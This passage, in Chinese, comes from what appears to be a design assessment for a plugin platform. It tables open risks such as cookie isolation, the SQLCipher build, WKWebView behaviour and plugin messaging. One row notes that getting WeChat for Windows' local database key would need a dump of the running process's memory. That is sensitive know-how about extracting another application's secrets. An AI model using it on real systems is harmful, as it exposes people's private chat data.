| 3 | **跨插件 cookie 隔离**（全局 `CookieHandler` 无法从 JS 关闭） | 需自写原生代码替换 | **高** —— 见 §8.2，是已知的第三处纯 TS 做不到的地方 |
| 4 | sqlcipher-android 4.17.0 内嵌 SQLite 版本与编译选项 | 未从应用内探测 `PRAGMA compile_options` | 低 —— 影子索引退路已实证 |
| 5 | iOS WKWebView 的对应行为 | 无 macOS 环境 | 中 —— 但 iOS 在路线图上晚于 Android |
| 6 | 微信 Windows 4.0.3.36 及更新版本是否仍可取出本地库密钥 | 需抓运行进程内存 | 低 —— 主路径是手动分享，自动化只是增强 |
| 7 | 第三方 UI 插件 `postMessage` 通道的完整性 | 未开始 | 中 —— P1 需做协议 fuzzing |
| 8 | Electron 44 的 `utilityProcess` + `safeStorage`（DPAPI） | 未开始 | 低 —— 文档已确认 API 存在 |

> **诚实说明**：本机已具备完整 Android 工具链（`D:\android-toolchain`，JDK 21 + SDK 36），
> 且 S1 / S2 / S3 与核心层均已在真机（Android 16 / API 36）上完成动态验证 —— 见 §13.1。
> 此处是早期评估：当时沙箱与插件运行时未落地。2026-10-18 已有 QuickJS 与文件安装；上表历史评估
> 目前仍只有源码级证据。它们要等 P1 才能被真正验证，这一点不能含糊过去。
> 其余结论建立在可复查的代码事实上，而非推测。
